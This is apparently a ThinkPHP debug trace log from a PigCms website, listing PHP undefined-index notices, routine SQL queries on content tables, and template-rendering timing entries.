+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002929s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002930s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.041992s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000977s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.042969s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.031250s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.074219s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.074219s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.075195s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.075195s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001953s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.076172s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000976s ]
+
